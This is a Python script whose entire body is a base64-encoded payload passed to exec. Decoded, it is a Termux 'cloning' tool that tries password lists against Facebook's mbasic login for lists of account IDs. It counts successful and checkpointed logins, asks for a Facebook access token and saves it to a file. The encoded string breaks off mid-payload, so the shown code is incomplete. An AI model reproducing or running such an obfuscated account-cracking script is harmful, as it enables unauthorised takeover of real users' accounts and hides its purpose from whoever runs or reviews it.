import base64
exec(base64.b64decode("I2NvZGluZz11dGYtOA0KIyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgcmVxdWVzdHMsYnM0LHN5cyxvcyxyYW5kb20sdGltZSxyZSxqc29uLHV1aWQsc3VicHJvY2VzcyxwbGF0Zm9ybSxiYXNlNjQNCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQ0KaW1wb3J0IHJlcXVlc3RzLGJzNCxzeXMsb3MscmFuZG9tLHRpbWUscmUsanNvbix1dWlkLHN1YnByb2Nlc3MNCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50DQppbXBvcnQgcmVxdWVzdHMsIHJlLCBvcywgdGltZQ0KaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFFBRElSYWJiYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQppbXBvcnQgcGxhdGZvcm0sYmFzZTY0DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3INCnRyeToNCiAgICAgaW1wb3J0IG9zLCBzdG9yYWdlLCByZXF1ZXN0cywgbWVjaGFuaXplLCBiczQsIGZ1dHVyZXMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3Rlcm11eC1zZXR1cC1zdG9yYWdlJykNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZScpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlJykNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCmN0ID0gZGF0ZXRpbWUubm93KCkNCm4gPSBjdC5tb250aA0KYnVsYW4gPSBbJ0phbnVhcnknLCAnRmVicnVhcnknLCAnTWFyY2gnLCAnQXByaWwnLCAnTWF5JywgJ0p1bmUnLCAnSnVseScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPY3RvYmVyJywgJ05vdmVtYmVyJywgJ0RlY2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCm51bSA9IDANCmxvb3AgPSAwDQpfc2lsZXRfa29jZW5nXyAgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCnVybF9tYiA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iDQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuX2tleSA9IHsiamFudWFyeSI6ICJKYW51YXJ5IiwgImZlYnJ1YXJ5IjogIkZlYnJ1YXJ5IiwgIm1hcmNoIjogIk1hcmNoIiwgImFwcmlsIjogIkFwcmlsIiwgIm1heSI6ICJNYXkiLCAianVuZSI6ICJKdW5lIiwgImp1bHkiOiAiSnVseSIsICJhdWd1c3QiOiAiQXVndXN0IiwgInNlcHRlbWJlciI6ICJTZXB0ZW1iZXIiLCAib2N0b2JlciI6ICJPY3RvYmVyIiwgIm5vdmVtYmVyIjogIk5vdmVtYmVyIiwgImRlY2VtYmVyIjogIkRlY2VtYmVyIn0NCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSJ9DQp1YV94aWFvbWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX25va2lhICAgPSAnbm9raWFjMy0wMC81LjAgKDA3LjIwKSBwcm9maWxlL21pZHAtMi4xIGNvbmZpZ3VyYXRpb24vY2xkYy0xLjEgbW96aWxsYS81LjAgYXBwbGV3ZWJraXQvNDIwKyAoa2h0bWwsIGxpa2UgZ2Vja28pIHNhZmFyaS80MjArJw0KdWFfYXN1cyAgICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX2h1YXdlaSAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBIVUFXRUkgWTcgUFJJTUUgMjAxOSBCdWlsZC81ODg3MjA4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTMuMC40NTc3LjYyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX3Zpdm8gICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyB2aXZvIDE5MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjIgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KdWFfb3BwbyAgICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEEzN2YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OS4wLjQzODkuMTA1IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX3NhbXN1bmcgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgU00tRzkwMFAgQnVpbGQvTFJYMjFUOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzQzLjAuMjM1Ny4xMjEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzUuMC4wLjQ4LjI3MztdJw0KdWFfd2luZG93cyA9ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX3JlYWxtZSA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFJFQUxNRSBSTVgxOTExIEJ1aWxkL05NRjI2RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgc2VwZXJ0aSBHZWNrbykgQ2hyb21lLzc2LjAuMzgwOS4xMTEgTW9iaWxlIFNhZmFyaS81MzcuMzYgQWxvaGFCcm93c2VyLzIuMjAuMycNClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTSA9ICdcMDMzWzA7OTFtJyAjIE1FUkFIIA0KSCA9ICdcMDMzWzE7OTJtJyAjIEhJSkFVIA0KSyA9ICdcMDMzWzE7OTFtJyAjIEtVTklORyANCkIgPSAnXDAzM1swOzk0bScgIyBCSVJVIA0KVSA9ICdcMDMzWzA7OTVtJyAjIFVOR1UgDQpPID0gJ1wwMzNbMDs5Nm0nICMgQklSVSBNVURBDQpOID0gJ1wwMzNbMG0nCSMgV0FSTkEgTUFUSSANCiANCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgUWFkaXJNYWhhcg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KUCA9ICdceDFiWzE7OTdtJyAjIA0KTSA9ICdcMDMzWzE7MzFtJyAjIA0KSCA9ICdcMDMzWzE7MzJtJyAjIA0KSyA9ICdceDFiWzE7OTdtJyAjIA0KQiA9ICdceDFiWzE7OTdtJyAjIA0KVSA9ICdceDFiWzE7OTdtJyAjIA0KTyA9ICdceDFiWzE7OTdtJyAjIA0KTiA9ICdceDFiWzBtJyAgICAjIA0KbXlfY29sb3IgPSBbDQogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0NCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikNCmRhdGEsZGF0YTI9e30se30NCmFtYW4sY3Asc2FsYWg9MCwwLDANCnViYWhQLGZ1Y2sscHdCYXJ1PVtdLFtdLFtdDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCmxvb3AgPSAwDQp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iDQp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSINCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCINCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSJ9DQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9DQpkb25lID0gRmFsc2UNCiMjIw0KYmlydGggPSBbJzAwMScsICcwMicsICcwMycsICcwNCcsICcwNScsICcwNicsICcwNycsICcwOCcsICcwOScsICcxMCcsICcxMScsICcxMicsICcxMycsICcxNCcsICcxNScsICcxNicsICcxNycsICcxOCcsICcxOScsICcyMCcsICcyMSddDQpiZCA9IHJhbmRvbS5yYW5kaW50KDJlNywgM2U3KQ0Kc2ltID0gcmFuZG9tLnJhbmRpbnQoMmU0LCA0ZTQpDQpoZWFkZXIgPSB7J3gtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgnOiByZXByKGJkKSwgJ3gtZmItc2ltLWhuaSc6IHJlcHIoc2ltKSwgJ3gtZmItbmV0LWhuaSc6IHJlcHIoc2ltKSwneC1mYi1jb25uZWN0aW9uLXF1YWxpdHknOiAnRVhDRUxMRU5UJywgJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODkuMC40Mzg5LjExNCBTYWZhcmkvNTM3LjMnLCd4LWZiLWNvbm5lY3Rpb24tdHlwZSc6ICd1bmtub3duJywnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsICd4LWZiLWh0dHAtZW5naW5lJzogJ0xpZ2VyJ30NCg0KZGVmIHZlcnNpb24oKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJyk7cHJpbnQoYmFubmVyKQ0KICAgIHByaW50KCcgXDAzM1sxOzkybVswMV0gXDAzM1sxOzkzbUZpbGUgQ2xvbmluZyAnKQ0KICAgIHByaW50KCcgXDAzM1sxOzkybVswMl0gXDAzM1sxOzkzbVB1YmxpYyBDbG9uaW5nICcpDQogICAgcHJpbnQoJyBcMDMzWzE7OTJtWzAzXSBcMDMzWzE7OTNtQ3JlYXRlIEZpbGUgJykNCiAgICBwcmludCgnIFwwMzNbMTs5Mm1bMDRdIFwwMzNbMTs5M21TZXByYXRlIElkeiAnKQ0KICAgIHByaW50KCcgXDAzM1sxOzkybVswNV0gXDAzM1sxOzkzbURvdWJsZSBJZHogQ3V0dGVyICcpDQogICAgcHJpbnQoJyBcMDMzWzE7OTJtWzA2XSBcMDMzWzE7OTNtUmVtb3ZlIFRva2VuJykNCiAgICBwcmludCgnIFwwMzNbMTs5Mm1bMDBdIFwwMzNbMTs5M21FeGl0ICcpDQogICAgcHJpbnQoJycpDQogICAgTUFIQVIgPSBpbnB1dCgnIFs/XSBDaG9vc2Ugb3B0aW9uIDogJykNCiAgICBpZiBNQUhBUiBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgZmlsZWNsb25lKCkNCiAgICBpZiBNQUhBUiBpbiAoJzInLCAnMDInKToNCiAgICAgICAgX194bnhfXygpLlFBRElSeChpZCkNCiAgICBpZiBNQUhBUiBpbiAoJzAzJywgJzMnKToNCiAgICAgICAgY3JlYXRlX2ZpbGUoKQ0KICAgIGlmIE1BSEFSIGluICgnNCcsICcwNCcpOg0KICAgIAlvcy5zeXN0ZW0oJ2NsZWFyJyk7cHJpbnQoYmFubmVyKTtzZXAoKQ0KICAgIGlmIE1BSEFSIGluICgnNScsICcwNScpOg0KICAgIAlkdXBjdXR0ZXIoKQ0KICAgIGlmIE1BSEFSIGluICgnNicsICcwNicpOg0KICAgICAgICB0aW1lLnNsZWVwKDIpDQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKTtwcmludChiYW5uZXIpO3ByaW50KCcgUmVtb3ZpbmcgVG9rZW4gLicpO3RpbWUuc2xlZXAoMSk7b3Muc3lzdGVtKCdjbGVhcicpO3ByaW50KGJhbm5lcik7cHJpbnQoJyBSZW1vdmluZyBUb2tlbiAuLicpO3RpbWUuc2xlZXAoMSk7b3Muc3lzdGVtKCdjbGVhcicpO3ByaW50KGJhbm5lcik7cHJpbnQoJyBSZW1vdmluZyBUb2tlbiAuLi4nKTt0aW1lLnNsZWVwKDIpO29zLnN5c3RlbSgnY2xlYXInKTtwcmludChiYW5uZXIpO3ByaW50KCdcMDMzWzE7OTFtVG9rZW4gUmVtb3ZlZFwwMzNbMG0nKTt0aW1lLnNsZWVwKDMpO29zLnN5c3RlbSgncm0gLXJmIGFjY2Vzc190b2tlbi50eHQnKTsgdmVyc2lvbigpDQogICAgaWYgTUFIQVIgaW4gKCcwJywgJzAwJyk6DQogICAgICAgIGV4aXQoJ1RoYW5rcyBGb3IgVXNpbmcgbWFtYScpDQogICAgZWxzZToNCiAgICAJcHJpbnQgKCcgICAgICAgIEludmFsaWQgU2VsZWN0JykNCiAgICB2ZXJzaW9uKCkNCg0KZGVmIGxvZ2luKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpO3ByaW50KGJhbm5lcikNCiAgICB0b2sgPSBpbnB1dCgnICBQdXQgYWNjZXNzIHRva2VuOiAnKQ0KICAgIGlmICdFQUFCJyBpbiB0b2s6DQogICAgICAgIHBhc3MNCiAgICBlbHNlOg0KICAgICAgICBwcmludCgnICBPbmx5IGZiIGFkcyBhY2Nlc3MgdG9rZW4gY2FuIGJlIHVzZWQgZm9yIHNjcmFwaW5nIGRhdGEnKQ0KICAgICAgICBwcmludCgnICBDaGVjayBtYWluIG1lbnUgZm9yIGNyZWF0aW5nIGZiIGFkcyBhY2Nlc3MgdG9rZW4uLi4ubycpDQogICAgICAgIG9zLnN5cy5leGl0KCkNCiAgICB0cnk6DQogICAgICAgIHUgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3RvaykudGV4dA0KICAgICAgICB1MSA9IGpzb24ubG9hZHModSkNCiAgICAgICAgbmFtZSA9IHUxWyduYW1lJ10NCiAgICAgICAgdHMgPSBvcGVuKCdhY2Nlc3NfdG9rZW4udHh0JywgJ3cnKQ0KICAgICAgICB0cy53cml0ZSh0b2spDQogICAgICAgIHRzLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoJyBMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5JykNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICB2ZXJzaW9uKCkNCiAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgIHByaW50KCdcbiAgSW52YWxpZCB0b2tlbiBwcm92aWRlZCwgdHJ5IGFnYWluICAnKQ0KICAgICAgICB0aW1lLnNsZWVwKDEpDQogICAgICAgIGxvZ2luKCkNCg0KZGVmIGJhbm5lcigpOg0KCXByaW50KGJhbm5lcikNCmRlZiBoYXNpbChvayxjcCk6DQoJaWYgbGVuKG9rKSAhPSAwIG9yIGxlbihjcCkgIT0gMDoNCgkJcHJpbnQoJ1xuXG5cMDMzWzBtIFRoZSBQcm9zZXNzIERvbmUuLi4nKQ0KCQlwcmludCgnXG5cMDMzWzE7OTJtVG90YWwgT0sgOiAlcyDigKIgIFRvdGFsIENQIDogJXMnJShzdHIobGVuKG9rKSksc3RyKGxlbihjcCkpKSk7ZXhpdCgpDQoJCSNwcmludCgnXDAzM1sxOzkxbUNIRUNLID4gJXMnJShzdHIobGVuKGNwKSkpKTtleGl0KCkNCgllbHNlOg0KCQlwcmludCgnXG5cMDMzWzBtRVJSUFInKQ0KCQlleGl0KCkNCgkJDQpkZWYgZmlsZWNsb25lKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpO3ByaW50KGJhbm5lcikNCiAgICBwcmludCgnIFwwMzNbMTs5Mm1bMV0gXDAzM1sxOzkzbUZpcnN0IE1ldGhvZCBGaWxlIENsb25pbmcgJykNCiAgICBwcmludCgnIFwwMzNbMTs5Mm1bMl0gXDAzM1sxOzkzbVNlY29uZCBNZXRob2QgRmlsZSBDbG9uaW5nJykNCiAgICBwcmludCgnIFwwMzNbMTs5Mm1bMF0gXDAzM1sxOzkzbUJhY2snKQ0KICAgIHByaW50KDU0KiJfIikNCiAgICBwcmludCgiIikNCiAgICBRQURJUiA9IGlucHV0KCdDaG9vc2UgbWV0aG9kIDogJykNCiAgICBpZiBRQURJUiBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgX19jcmFja19fKCkucGxlcnIoKQ0KICAgIGlmIFFBRElSIGluICgnMDInLCAnMicpOg0KICAgIAlfX3h4eF9fKCkuUUFESVJ4KGlkKQ0KICAgIGlmIFFBRElSIGluICgnMCcsICcwJyk6DQogICAgCXZlcnNpb24oKQ0KICAgIGVsc2U6DQogICAgCXByaW50KCdJbnZhbGlkIFNlbGVjdCcpO3RpbWUuc2xlZXAoMSk7IHZlcnNpb24oKQ0KICAgIA0KY2xhc3MgX19jcmFja19fOg0KCWRlZiBfX2luaXRfXyhzZWxmKToNCgkJc2VsZi5pZCA9IFtdDQoJZGVmIHBsZXJyKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIik7cHJpbnQoYmFubmVyKQ0KCQl0cnk6DQoJCQlzZWxmLmFwayA9IGlucHV0KCJbK10gRmlsZSBQYXRoIDogICIpDQoJCQlwcmludCAoJycpDQoJCQlzZWxmLmlkID0gb3BlbihzZWxmLmFwaykucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlleGNlcHQ6DQoJCQlwcmludCgnXG4gWyFdIEZpbGUgTm90IEZvdW5kIEluIFN0b3JhZ2UnKQ0KCQkJaW5wdXQoJ1xuIFsqXSBQcmVzcyBFbnRlciBUbyBCYWNrJyk7dmVyc2lvbigpDQogICAgIA0KCQlzZWxmLl9fcGxlcl9fKCkNCglkZWYgX19tYmFzaWNfXyhzZWxmLCB1c2VyLCBfc2VtcGFrXyk6DQoJCWdsb2JhbCBvayxjcCxsb29wDQoJCXN5cy5zdGRvdXQud3JpdGUoZiJcciBceDFiWzE7OTJtW1FhZGlyXSB7bG9vcH0ve2xlbihzZWxmLmlkKX0gW09LLXtsZW4ob2spfV0gW0NQLXtsZW4oY3ApfV0gIikNCgkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCWZvciBwdyBpbiBfc2VtcGFrXzoNCgkJCXB3ID0gcHcubG93ZXIoKQ0KCQkJdHJ5OiBvcy5ta2RpcignJykNCgkJCWV4Y2VwdDogcGFzcw0KCQkJdHJ5Og0KCQkJCXVhX3hpYW9taSA9IG9wZW4oJ2FnZW50LnR4dCcsICdyJykucmVhZCgpDQoJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQl1YV94aWFvbWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCgkJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQkJaGVhZGVyc18gPSB7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKltpbnNlcnRlZCBieSBjeXRob24gdG8gYXZvaWQgY29tbWVudCBjbG9zZXJdL1tpbnNlcnRlZCBieSBjeXRob24gdG8gYXZvaWQgY29tbWVudCBzdGFydF0qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwiZG50IjoiMSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLCJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5Iiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44In0NCgkJCXAgPSBzZXMuZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRicsIGhlYWRlcnM9aGVhZGVyc18pLnRleHQNCgkJCWRhdGFhID0geyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwidWlkIjp1c2VyLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyJ9DQoJCQlfaGVhZGVycyA9IHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKltpbnNlcnRlZCBieSBjeXRob24gdG8gYXZvaWQgY29tbWVudCBjbG9zZXJdL1tpbnNlcnRlZCBieSBjeXRob24gdG8gYXZvaWQgY29tbWVudCBzdGFydF0qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLCJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwicmVmZXJlciI6Imh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3